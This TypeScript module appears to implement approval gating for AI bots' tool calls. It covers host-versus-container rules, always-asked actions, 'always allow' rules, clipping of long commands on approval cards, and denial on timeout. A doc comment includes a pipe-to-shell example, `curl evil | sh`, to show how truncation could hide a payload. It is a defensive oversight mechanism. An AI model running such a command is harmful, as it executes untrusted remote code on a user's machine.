/**
 * noid's approvals: which of a bot's tool calls wait for the owner, with pi-pocket's mechanism (`Approvals`: a card in
 * the app and a push notification with Allow and Deny, the answer kept in the call's memo so a restart never asks
 * twice) and rakazo's classification (`packages/core/src/action-approval.ts`, Apache-2.0):
 *
 * - A computer bot runs its shell, files, browser, and its own memory and schedules without asking: the container is
 *   the boundary. Forgetting a memory asks (rakazo's `forget_memory`).
 * - A host bot asks before anything that changes this machine: bash that is not read-only (by `read-only.ts`),
 *   write, and edit.
 * - Sessions that are not bots are Pi's own: they never ask (Pi's way).
 *
 * "Always allow" on a card keeps a rule for that bot and tool. A question nobody answers in time is denied; time never
 * allows anything.
 */
import type { Context } from "@earendil-works/chord";
import type { ToolAnnotations } from "@earendil-works/pi-coding-agent";
import {
    CompactionTask,
    defineDoc,
    defineExtension,
    hook,
    ToolTask,
} from "@earendil-works/pi-durable";
import type { ToolExecutionApi } from "@earendil-works/pi-durable";
import type { PocketApp } from "../app.ts";
import { BUILT_IN_TOOLS } from "../reload.ts";
import type { ApprovalAnswer } from "../host.ts";
import { AutoReviewDoc, consequential, review } from "./auto-review.ts";
import { onlyReads } from "./read-only.ts";
import type { BotProfile } from "./bots.ts";

/** The start of the id of every question noid asks, which only it may turn into an "always allow" rule. */
export const NOID_APPROVAL = "noid:";
/** The start of the id of a question auto review raised: never made into an "always allow" rule. */
export const AUTO_REVIEW_APPROVAL = `${NOID_APPROVAL}review:`;

/** Rules the owner made with "Always allow": a bot's calls of a tool that run without asking from then on. */
export const ApprovalRulesDoc = defineDoc<{
    rules: { bot: string; tool: string; at: number; by: string }[];
}>({
    kind: "x.noid.approval-rules",
    version: 1,
    scope: "session",
    initial: () => ({ rules: [] }),
});

export type Verdict = { ask: false } | { ask: true; reason: string; subject: string };

/**
 * Calls asked about every time: forgetting a memory, archiving a bot, changing another bot, making a bot on this
 * machine. "Always allow" never answers them for good (rakazo asks for these whatever the rules say).
 */
export function alwaysAsks(tool: string, args: Record<string, unknown> = {}): boolean {
    return (
        tool === "bot_archive" ||
        tool === "bot_update" ||
        (tool === "bot_create" && args.kind === "host") ||
        (tool === "memory" && args.action === "remove")
    );
}

/** Where a bot's conversation runs now: its folder decides, not the kind it was made as (a folder can move). */
export type Place = "host" | "computer";

/**
 * Tools a host bot uses without asking although they do not only read: they change the bot's own state, not this
 * machine (rakazo exempts remember, schedules, and subagents too). A subagent's own calls are checked as the bot's.
 */
const BOT_STATE_TOOLS = new Set([
    "memory",
    "schedule",
    "subagent",
    "goal",
    // Bot mail and Noid's overseer tools change bots, not this machine (bot_archive asks above).
    "bots",
    "bot_message",
    "bot_brief",
    "bot_create",
]);

/**
 * The session tools' calls that put work into a session: sessions run on this machine and never ask, so a bot's
 * would reach past the container (or past its own approvals) to the owner's files.
 */
function startsWork(tool: string, args: Record<string, unknown>): boolean {
    return (
        tool === "session_start" ||
        tool === "session_send" ||
        (tool === "session_schedule" && args.action === "add") ||
        (tool === "repo_watch" && args.action === "add") ||
        (tool === "session_watch_pr" && args.action === "start")
    );
}

/** The session tools' calls that only look: a bot must read a session before it acts on it. */
function onlyLooks(tool: string, args: Record<string, unknown>): boolean {
    return (
        tool === "sessions" ||
        tool === "session_read" ||
        (["session_schedule", "repo_watch", "approvals"].includes(tool) &&
            args.action === "list") ||
        (tool === "session_watch_pr" && args.action === "status")
    );
}

/**
 * Whether a bot's call asks the owner first, by rakazo's classes. On this machine a bot asks before anything that is
 * not read-only, by `read-only.ts`'s list of what only looks (so a tool nobody listed asks); on the shared computer the
 * container is the boundary. Pure, so the rules are easy to read and test.
 */
export function classify(
    bot: BotProfile | undefined,
    place: Place,
    tool: string,
    args: Record<string, unknown>,
    readOnly = false,
): Verdict {
    if (bot === undefined) {
        return { ask: false };
    }

    if (tool === "memory" && args.action === "remove") {
        return {
            ask: true,
            reason: "forgets a memory",
            subject: `forget ${String(args.id ?? "")}`,
        };
    }

    // rakazo's archive_bot, and a bot changed by another bot (rakazo's propose_instructions_update): always asked,
    // wherever it runs, as either changes what a bot does from then on.
    if (tool === "bot_archive") {
        return {
            ask: true,
            reason: "archives a bot",
            subject: `archive ${String(args.name ?? "")}`,
        };
    }

    if (tool === "bot_update") {
        return {
            ask: true,
            reason: "changes another bot",
            subject: subjectOf("bot_update", {
                name: args.name,
                role: args.role,
                instructions: args.instructions,
            }),
        };
    }

    // Noid looks after the sessions for the owner: putting work in them is what it is for. Any other bot asks.
    if (startsWork(tool, args) && bot.main !== true) {
        return {
            ask: true,
            reason: "puts work in a session on your machine",
            subject: subjectOf(tool, args),
        };
    }

    if (onlyLooks(tool, args)) {
        return { ask: false };
    }

    // A bot on this machine reads it without asking: one made by a bot (on the computer, say, and talked into it by a
    // page) would reach past the container to the owner's files. The owner says yes to each, and to its folder.
    if (tool === "bot_create" && args.kind === "host") {
        return {
            ask: true,
            reason: "makes a bot on your machine",
            // Whole and as written: the folder the bot works in is the one the owner reads here.
            subject: subjectOf("bot_create", {
                folder: args.folder,
                name: args.name,
                role: args.role,
            }),
        };
    }

    if (place === "computer" || BOT_STATE_TOOLS.has(tool)) {
        return { ask: false };
    }

    if (onlyReads(tool, args, readOnly)) {
        return { ask: false };
    }

    const subject = subjectOf(tool, args);
    const reason =
        tool === "bash"
            ? "runs a command on your machine"
            : tool === "write"
              ? "writes a file on your machine"
              : tool === "edit"
                ? "edits a file on your machine"
                : `uses ${tool} on your machine`;

    return { ask: true, reason, subject };
}

/** The most of a command, or of one argument, an approval card holds: the card scrolls, so this bounds what is stored. */
const SUBJECT_MAX = 8000;
const FIELD_MAX = 4000;

/** Text too long to hold whole: its start and its end, and between them how much is not shown, so the card says so. */
function clipMiddle(text: string, max: number): string {
    return text.length <= max
        ? text
        : `${text.slice(0, max / 2)}\n… ${String(text.length - max)} characters not shown …\n${text.slice(-max / 2)}`;
}

/** Arguments with each text cut on its own: a long one cannot push the next off the card. */
function shown(value: unknown): unknown {
    if (typeof value === "string") {
        return clipMiddle(value, FIELD_MAX);
    }

    if (Array.isArray(value)) {
        return value.map(shown);
    }

    return value !== null && typeof value === "object"
        ? Object.fromEntries(Object.entries(value).map(([key, each]) => [key, shown(each)]))
        : value;
}

/**
 * A call as an approval card shows it: the command, the file, or its arguments, as written. One too long to hold whole
 * shows its start and its end and says how much is between: a cut end could hide what the owner says yes to
 * (`cat x; …; curl evil | sh`), and every argument keeps its place (a padded name cannot push a folder off).
 */
export function subjectOf(tool: string, args: Record<string, unknown>): string {
    return tool === "bash"
        ? clipMiddle(String(args.command ?? ""), SUBJECT_MAX)
        : tool === "write" || tool === "edit"
          ? clipMiddle(String(args.path ?? ""), FIELD_MAX)
          : JSON.stringify(shown(args), null, 1);
}

/** How long a question waits before it is denied (NOID_APPROVAL_MINUTES, default an hour). */
function waitMs(): number {
    const minutes = Number(process.env.NOID_APPROVAL_MINUTES ?? 60);

    return (minutes > 0 ? minutes : 60) * 60_000;
}

/**
 * The hooks: always on, as approvals are a guard, not an option (pi-pocket's core-or-extension rule C1). A bot's
 * summaries are guarded here too, whether its session tools are on or off: written with what came from outside left
 * out (`noid-compact.ts`), never Pi Durable's, which reads it as it is.
 */
export function createApprovals(app: PocketApp) {
    return defineExtension({
        name: "noid-approvals",
        hooks: [
            hook(CompactionTask, {
                beforeCompact: (compaction, api, context) =>
                    app.noidCompaction.summarize(compaction, api, context),
            }),
            hook(ToolTask, {
                beforeTool: async (call, api, context: Context) => {
                    const bot = app.bots.of(api.conversationId);

                    if (bot === undefined) {
                        return undefined;
                    }

                    // A tool's own read-only mark counts; a built-in's can only come from a wrap.
                    const runtime = api as typeof api & Partial<Pick<ToolExecutionApi, "agent">>;
                    const declared = (await runtime.agent?.(context))?.tools.find(
                        (tool) => tool.name === call.name,
                    ) as { annotations?: ToolAnnotations } | undefined;
                    const args = call.arguments as Record<string, unknown>;
                    const readOnly =
                        !BUILT_IN_TOOLS.has(call.name) &&
                        declared?.annotations?.readOnlyHint === true;
                    let verdict = classify(
                        bot,
                        app.onHost(api.conversationId) ? "host" : "computer",
                        call.name,
                        args,
                        readOnly,
                    );
                    // What this call was already found, or told, before a restart stands, whatever has changed since:
                    // a flagged call waiting for the owner runs only once the owner says so.
                    let answer = await api.memo<ApprovalAnswer>("noid.approval", context);
                    let reviewed = await api.memo<{ ask: boolean; reason: string }>(
                        "noid.review",
                        context,
                    );

                    if (answer === undefined && reviewed === undefined) {
                        const ruled = async () =>
                            ((await api.snapshot(ApprovalRulesDoc, context))?.rules ?? []).some(
                                (rule) => rule.bot === bot!.id && rule.tool === call.name,
                            );

                        if (verdict.ask) {
                            // "Always allow" answers a question for good, but those asked every time.
                            if (!alwaysAsks(call.name, args) && (await ruled())) {
                                return undefined;
                            }
                        } else {
                            // Auto review looks only at calls that would run without asking and change something;
                            // "always allow" wins over it too. Checked once per call: a replay asks no model again.
                            if (
                                !consequential(call.name, args, readOnly) ||
                                (await api.snapshot(AutoReviewDoc, context))?.on !== true ||
                                (await ruled())
                            ) {
                                return undefined;
                            }

                            const signal = (api as typeof api & { signal?: AbortSignal }).signal;

                            reviewed = await api.memo(
                                "noid.review",
                                await review(app, api.conversationId, bot, call.name, args, signal),
                                context,
                            );
                        }
                    }

                    if (!verdict.ask && reviewed !== undefined) {
                        if (!reviewed.ask) {
                            return undefined;
                        }

                        verdict = {
                            ask: true,
                            reason: reviewed.reason,
                            subject: subjectOf(call.name, args),
                        };
                    }

                    if (!verdict.ask) {
                        return undefined;
                    }

                    if (answer === undefined) {
                        // Its own id (Lancet Guard's is the bare call): "always allow" only answers noid's own questions,
                        // and never one auto review raised (that would turn auto review off for the tool for good).
                        const id = `${reviewed?.ask === true ? AUTO_REVIEW_APPROVAL : NOID_APPROVAL}${api.taskId}:${call.id}`;
                        const timer = setTimeout(
                            () => app.approvals.answer(id, { allow: false, by: "nobody, in time" }),
                            waitMs(),
                        );

                        timer.unref();

                        try {
                            const asked = await app.approvals.request(
                                {
                                    id,
                                    conversationId: api.conversationId,
                                    taskId: api.taskId,
                                    callId: call.id,
                                    tool: call.name,
                                    subject: verdict.subject,
                                    reason: `${bot!.name} ${verdict.reason}`,
                                    createdAt: Date.now(),
                                },
                                context,
                            );

                            answer = await api.memo<ApprovalAnswer>(
                                "noid.approval",
                                asked,
                                context,
                            );
                        } finally {
                            clearTimeout(timer);
                        }
                    }

                    return answer.allow
                        ? undefined
                        : {
                              block: `${answer.by} denied this ${call.name} call (${verdict.reason}). Do not try to get around it; say what you wanted to do instead.`,
                          };
                },
            }),
        ],
    });
}
